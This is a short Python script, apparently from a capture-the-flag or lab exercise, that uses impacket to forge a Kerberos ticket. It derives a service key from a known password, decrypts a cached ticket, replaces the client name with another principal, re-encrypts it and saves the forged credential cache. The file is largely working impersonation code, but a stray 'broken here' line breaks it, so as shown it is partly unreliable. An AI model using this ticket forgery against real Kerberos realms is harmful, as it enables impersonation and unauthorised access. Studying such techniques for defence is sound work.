"""
ticketer for MIT ccache via impacket
"""

import os

import impacket.krb5.asn1 as asn1
from hexdump import hexdump
from impacket.krb5.ccache import CCache, CountedOctetString, Principal as CCPrincipal
from impacket.krb5.crypto import _AES256CTS
from impacket.krb5.types import _asn1_decode, Principal, Ticket
from pyasn1.codec.der import decoder, encoder


ccache = CCache.loadFile(os.environ['KRB5CCNAME'])
ccache.prettyPrint()

ticket = Ticket().from_asn1(ccache.credentials[0].ticket.fields['data'])

# key for test/ctfb1@EXAMPLE.COM with password '123456' is '9c008f673b0c34d28ff483587f77ddb76f35545fcc69a0ae709f16f20e8765ee'
key = _AES256CTS.string_to_key('123456', 'EXAMPLE.COMtestctfb1', None)
print(key.contents.hex())

scratch = _AES256CTS.decrypt(key, 2, ticket.encrypted_part.ciphertext.encode('latin1'))
dec_tkt_part = decoder.decode(scratch, asn1Spec=asn1.EncTicketPart())[0]
print(dec_tkt_part)

new_principal = Principal('client1', default_realm='EXAMPLE.COM', type=dec_tkt_part.getComponentByName('cname').getComponentByName('name-type'))
new_principal.components_to_asn1(dec_tkt_part.getComponentByName('cname'))
print(dec_tkt_part)

scratch = encoder.encode(dec_tkt_part)
new_ticket = _AES256CTS.encrypt(key, 2, scratch, None)

broken here

#breakpoint()
#ccache.credentials[0].ticket.fields['data'] = new_ticket
#ccache.credentials[0].ticket.fields['length'] = len(ccache.credentials[0].ticket.fields['data'])
#ccache.credentials[0].ticket.fields['_data'] = len(ccache.credentials[0].ticket.fields['data'])

ccache.credentials[0].ticket = CountedOctetString(new_ticket.decode('latin1'))

x = CCPrincipal()
x.fromPrincipal(new_principal)
ccache.principal = x
ccache.credentials[0].header.fields['client'] = x

ccache.saveFile('/tmp/eee')
